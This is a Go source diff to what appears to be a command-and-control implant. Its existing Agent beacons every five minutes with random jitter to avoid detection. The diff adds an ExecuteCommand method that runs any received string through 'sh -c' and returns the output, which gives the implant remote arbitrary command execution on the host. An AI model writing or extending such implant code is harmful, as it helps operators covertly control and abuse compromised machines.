@@ -8,6 +8,7 @@ import (
 	"math/rand"
 	"net/http"
 	"os"
+	"os/exec"
 	"runtime"
 	"time"
 )
@@ -74,4 +75,12 @@ func (a *Agent) StartBeaconing() {
 		jitter := time.Duration(rand.Intn(60)) * time.Second // 0-60s jitter
 		time.Sleep(300*time.Second + jitter)                 // beacon every 5min + jitter
 	}
+}
+
+func (a *Agent) ExecuteCommand(cmd string) (string, error) {
+	out, err := exec.Command("sh", "-c", cmd).Output()
+	if err != nil {
+		return "", err
+	}
+	return string(out), nil
 }
